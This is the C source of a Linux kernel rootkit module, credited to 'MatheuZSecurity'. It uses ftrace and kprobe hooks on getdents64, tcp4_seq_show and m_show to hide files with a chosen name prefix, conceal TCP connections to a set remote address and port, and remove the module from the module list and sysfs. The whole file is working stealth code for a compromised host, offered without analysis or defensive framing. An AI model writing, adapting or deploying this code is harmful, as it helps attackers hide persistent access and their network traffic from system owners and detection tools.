// Thanks to MatheuZSecurity

#include <em_ksnftc.h>

#include <linux/dirent.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/kobject.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>
#include <net/sock.h>

typedef int (*em_ksnftc_show_fn)(struct seq_file *seq, void *v);
typedef asmlinkage long (*em_ksnftc_syscall_fn)(const struct pt_regs *regs);

struct em_ksnftc_hook
{
	const char *name;
	void *function;
	unsigned long address;
	struct ftrace_ops ops;
};

static long em_ksnftc_getdents64_hook(const struct pt_regs *regs);
static int em_ksnftc_tcp4_seq_show(struct seq_file *seq, void *v);
static int em_ksnftc_m_show(struct seq_file *seq, void *v);

static struct em_ksnftc_hook getdents_hook = {
	.name = "__x64_sys_getdents64",
	.function = em_ksnftc_getdents64_hook,
};
static struct em_ksnftc_hook tcp4_hook = {
	.name = "tcp4_seq_show",
	.function = em_ksnftc_tcp4_seq_show,
};
static struct em_ksnftc_hook m_show_hook = {
	.name = "m_show",
	.function = em_ksnftc_m_show,
};

static unsigned long lookup_symbol(const char *name)
{
	struct kprobe probe = {.symbol_name = name};
	unsigned long address;

	if (register_kprobe(&probe) < 0)
		return 0;
	address = (unsigned long)probe.addr;
	unregister_kprobe(&probe);
	return address;
}

static void notrace em_ksnftc_thunk(unsigned long ip, unsigned long parent_ip,
									struct ftrace_ops *ops,
									struct ftrace_regs *fregs)
{
	struct em_ksnftc_hook *hook = container_of(ops, struct em_ksnftc_hook, ops);
	struct pt_regs *regs = ftrace_get_regs(fregs);

	if (likely(!within_module(parent_ip, THIS_MODULE)))
		regs->ip = (unsigned long)hook->function;
}

static bool name_is_hidden(const char *name, size_t limit)
{
	size_t prefix_len = strnlen(hidden_prefix, 64);

	return limit >= prefix_len && prefix_len > 0 &&
		   strncmp(name, hidden_prefix, prefix_len) == 0;
}

static long em_ksnftc_getdents64_hook(const struct pt_regs *regs)
{
	char __user *user_buffer = (char __user *)regs->si;
	long total = ((em_ksnftc_syscall_fn)getdents_hook.address)(regs);
	unsigned char *kernel_buffer;
	size_t input = 0, output = 0;

	if (total <= 0 || total > 65536 || !user_buffer)
		return total;
	kernel_buffer = memdup_user(user_buffer, (size_t)total);
	if (IS_ERR(kernel_buffer))
		return total;
	while (input < (size_t)total)
	{
		struct linux_dirent64 *entry = (void *)(kernel_buffer + input);
		unsigned int reclen = entry->d_reclen;
		size_t name_offset = offsetof(struct linux_dirent64, d_name);
		bool hidden;

		if (reclen < name_offset + 1 || input + reclen > (size_t)total)
			break;
		hidden = name_is_hidden(entry->d_name, reclen - name_offset - 1);
		if (hidden)
		{
			atomic64_inc(&em_ksnftc_hide_hits);
		}
		else
		{
			if (output != input)
				memmove(kernel_buffer + output,
						kernel_buffer + input, reclen);
			output += reclen;
		}
		input += reclen;
	}
	if (output != (size_t)total &&
		copy_to_user(user_buffer, kernel_buffer, output) != 0)
		pr_debug("em_ksnftc: directory copy failed\n");
	kfree(kernel_buffer);
	atomic64_inc(&em_ksnftc_syscall_hits);
	return (long)output;
}

static int em_ksnftc_tcp4_seq_show(struct seq_file *seq, void *v)
{
	const struct sock *sk = v;
	const struct inet_sock *inet;

	if (v != SEQ_START_TOKEN && sk->sk_family == AF_INET &&
		sk->sk_state != TCP_TIME_WAIT && sk->sk_state != TCP_NEW_SYN_RECV)
	{
		inet = inet_sk((struct sock *)sk);
		if (ntohl(inet->inet_daddr) == remote_addr &&
			ntohs(inet->inet_dport) == remote_port)
		{
			atomic64_inc(&em_ksnftc_hide_hits);
			return 0;
		}
	}
	return ((em_ksnftc_show_fn)tcp4_hook.address)(seq, v);
}

static int em_ksnftc_m_show(struct seq_file *seq, void *v)
{
	if (v == THIS_MODULE)
	{
		atomic64_inc(&em_ksnftc_hide_hits);
		return 0;
	}
	return ((em_ksnftc_show_fn)m_show_hook.address)(seq, v);
}

static int hook_install(struct em_ksnftc_hook *hook)
{
	int error;

	hook->address = lookup_symbol(hook->name);
	if (!hook->address)
		return -ENOENT;
	hook->ops.func = (ftrace_func_t)em_ksnftc_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
					  FTRACE_OPS_FL_IPMODIFY;
	error = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (error)
		return error;
	error = register_ftrace_function(&hook->ops);
	if (error)
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	return error;
}

static void hook_remove(struct em_ksnftc_hook *hook)
{
	if (!hook->address)
		return;
	unregister_ftrace_function(&hook->ops);
	ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	hook->address = 0;
}

int em_ksnftc_install_hooks(void)
{
	struct em_ksnftc_hook *hooks[] = {&getdents_hook, &tcp4_hook,
									  &m_show_hook};
	size_t installed = 0;
	size_t i;
	int error;

	for (i = 0; i < ARRAY_SIZE(hooks); i++)
	{
		error = hook_install(hooks[i]);
		if (error)
		{
			while (installed--)
				hook_remove(hooks[installed]);
			return error;
		}
		installed++;
	}
	return 0;
}

void em_ksnftc_remove_hooks(void)
{
	hook_remove(&m_show_hook);
	hook_remove(&tcp4_hook);
	hook_remove(&getdents_hook);
}

void em_ksnftc_hide_sysfs(void)
{
	kobject_del(&THIS_MODULE->mkobj.kobj);
}

void em_ksnftc_restore_sysfs(void)
{
	if (kobject_add(&THIS_MODULE->mkobj.kobj, NULL, "%s", THIS_MODULE->name))
		pr_warn("em_ksnftc: sysfs restore failed\n");
}
